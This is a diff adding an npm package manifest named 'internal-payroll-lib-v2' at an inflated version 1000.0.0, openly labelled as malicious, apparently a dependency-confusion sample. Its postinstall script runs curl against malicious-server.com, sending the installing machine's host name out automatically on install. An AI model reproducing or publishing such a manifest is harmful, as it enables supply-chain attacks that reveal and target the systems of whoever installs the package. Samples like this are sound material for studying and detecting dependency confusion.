@@ -1,0 +1,11 @@
+{
+  "name": "internal-payroll-lib-v2",
+  "version": "1000.0.0",
+  "description": "Malicious code",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "curl http://malicious-server.com/$(hostname)"
+  },
+  "author": "malicious-actor",
+  "license": "MIT"
+}
